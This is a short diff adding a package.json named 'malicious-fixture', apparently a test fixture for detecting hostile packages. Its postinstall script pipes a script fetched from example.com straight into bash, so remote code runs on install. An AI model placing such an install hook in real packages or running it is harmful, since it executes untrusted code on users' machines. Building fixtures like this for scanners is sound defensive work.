@@ -1,0 +1,7 @@
+{
+  "name": "malicious-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -sL https://example.com/install.sh | bash"
+  }
+}
